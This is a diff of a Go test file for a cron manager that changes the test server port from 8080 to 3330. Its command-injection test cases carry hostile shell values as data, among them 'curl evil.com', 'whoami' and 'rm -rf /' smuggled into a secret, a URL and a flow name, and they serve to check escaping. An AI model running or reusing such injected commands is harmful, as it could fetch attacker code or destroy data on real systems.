@@ -102,7 +102,7 @@ steps: [{
 
 // TestCronURLEncoding tests that flow names are properly URL encoded
 func TestCronURLEncoding(t *testing.T) {
-	manager := NewCronManager("http://localhost:8080", "test-secret")
+	manager := NewCronManager("http://localhost:3330", "test-secret")
 
 	// We'll verify URL encoding directly without mocking exec.Command
 	_ = manager // manager would be used in real cron entry generation
@@ -112,11 +112,11 @@ func TestCronURLEncoding(t *testing.T) {
 		expectedURL string
 		desc        string
 	}{
-		{"simple", "http://localhost:8080/cron/simple", "simple name"},
-		{"with spaces", "http://localhost:8080/cron/with%20spaces", "name with spaces"},
-		{"special!@#$%", "http://localhost:8080/cron/special%21@%23$%25", "special characters"},
-		{"path/to/flow", "http://localhost:8080/cron/path%2Fto%2Fflow", "slash in name"},
-		{"unicode-日本語", "http://localhost:8080/cron/unicode-%E6%97%A5%E6%9C%AC%E8%AA%9E", "unicode characters"},
+		{"simple", "http://localhost:3330/cron/simple", "simple name"},
+		{"with spaces", "http://localhost:3330/cron/with%20spaces", "name with spaces"},
+		{"special!@#$%", "http://localhost:3330/cron/special%21@%23$%25", "special characters"},
+		{"path/to/flow", "http://localhost:3330/cron/path%2Fto%2Fflow", "slash in name"},
+		{"unicode-日本語", "http://localhost:3330/cron/unicode-%E6%97%A5%E6%9C%AC%E8%AA%9E", "unicode characters"},
 	}
 
 	for _, tc := range testCases {
@@ -124,7 +124,7 @@ func TestCronURLEncoding(t *testing.T) {
 			// This would be called internally when building cron entries
 			// We're testing that the URL is properly encoded
 			encodedName := url.PathEscape(tc.flowName)
-			actualURL := fmt.Sprintf("http://localhost:8080/cron/%s", encodedName)
+			actualURL := fmt.Sprintf("http://localhost:3330/cron/%s", encodedName)
 			assert.Equal(t, tc.expectedURL, actualURL)
 		})
 	}
@@ -139,25 +139,25 @@ func TestCronCommandInjection(t *testing.T) {
 		desc       string
 	}{
 		{
-			serverURL:  "http://localhost:8080",
+			serverURL:  "http://localhost:3330",
 			cronSecret: "secret$(whoami)",
 			flowName:   "test",
 			desc:       "command injection in secret",
 		},
 		{
-			serverURL:  "http://localhost:8080$(curl evil.com)",
+			serverURL:  "http://localhost:3330$(curl evil.com)",
 			cronSecret: "secret",
 			flowName:   "test",
 			desc:       "command injection in server URL",
 		},
 		{
-			serverURL:  "http://localhost:8080",
+			serverURL:  "http://localhost:3330",
 			cronSecret: "secret",
 			flowName:   "test$(rm -rf /)",
 			desc:       "command injection in flow name",
 		},
 		{
-			serverURL:  "http://localhost:8080",
+			serverURL:  "http://localhost:3330",
 			cronSecret: "secret'||curl evil.com||'",
 			flowName:   "test",
 			desc:       "single quote injection in secret",
